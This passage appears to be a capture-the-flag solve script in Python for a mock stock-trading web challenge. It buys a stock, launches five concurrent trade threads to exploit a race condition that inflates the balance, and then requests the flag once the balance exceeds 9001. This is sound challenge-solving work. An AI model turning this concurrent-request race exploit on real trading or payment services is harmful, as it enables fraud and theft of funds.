        except:
            return {"balance": 0}

    def buy_stock(stock):
        try:
            r = requests.post(f"{BASE_URL}/buy", data={"key": key, "stock": stock})
            print(f"Buy {stock} result: {r.text}")
            return r.text == "SUCCESS"
        except:
            return False

    print("Initial balance:")
    print(get_balance())

    # Buy BURPSHARKHAT - it has higher price so we can trade down
    if buy_stock("BURPSHARKHAT"):
        time.sleep(1)
        print("After buying BURPSHARKHAT:")
        print(get_balance())

        # Now try to exploit market_scrape race condition
        # We'll trade BURPSHARKHAT for BROOKING multiple times quickly

        trades = []
        for _ in range(5):
            t = threading.Thread(target=make_trade, args=(key, "BURPSHARKHAT", "BROOKING"))
            trades.append(t)
            t.start()

        for t in trades:
            t.join()

        time.sleep(2)

        # Check our portfolio
        portfolio = get_balance()
        print("Portfolio after trades:")
        print(portfolio)

        # Try to get flag if we have enough
        if portfolio.get("balance", 0) > 9001:
            print("Getting flag...")
            r = requests.post(f"{BASE_URL}/flag", data={"key": key})
            print(f"Flag response: {r.text}")

